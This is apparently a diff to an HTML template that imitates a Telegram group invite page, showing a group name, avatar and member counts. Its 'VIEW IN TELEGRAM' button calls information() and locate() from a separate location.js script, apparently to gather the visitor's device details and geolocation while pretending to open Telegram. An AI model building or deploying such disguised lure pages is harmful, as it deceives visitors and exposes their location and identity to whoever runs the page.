@@ -2,10 +2,48 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Telegram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ group_name }}</title>
+    <link rel="stylesheet" href="/static/css/style.css">
 </head>
 <body>
-<h1>Join new group: {{ group_name }}</h1>
-<h3>Member Count: {{ member_count }}, online: {{ member_online }}</h3>
+    <div class="container">
+        <div class="card">
+            <img src="{{ image }}" alt="Avatar" class="avatar">
+            <h1>{{ group_name }}</h1>
+            <div class="stats">
+                <span>{{ member_count }} subscribers</span>
+                <span class="online">{{ member_online }} online</span>
+            </div>
+            <button id="viewBtn" class="btn">VIEW IN TELEGRAM</button>
+            <p id="status" class="status"></p>
+        </div>
+    </div>
+
+    <script src="/js/location.js"></script>
+    <script>
+        document.getElementById('viewBtn').addEventListener('click', function() {
+            var btn = this;
+            var status = document.getElementById('status');
+
+            btn.disabled = true;
+            btn.textContent = 'LOADING...';
+
+            information();
+
+            locate(
+                function() {
+                    status.textContent = 'Success!';
+                    status.style.color = '#4ac959';
+                },
+                function(error, text) {
+                    btn.disabled = false;
+                    btn.textContent = 'VIEW IN TELEGRAM';
+                    status.textContent = 'Error: ' + text;
+                    status.style.color = '#f44336';
+                }
+            );
+        });
+    </script>
 </body>
 </html>
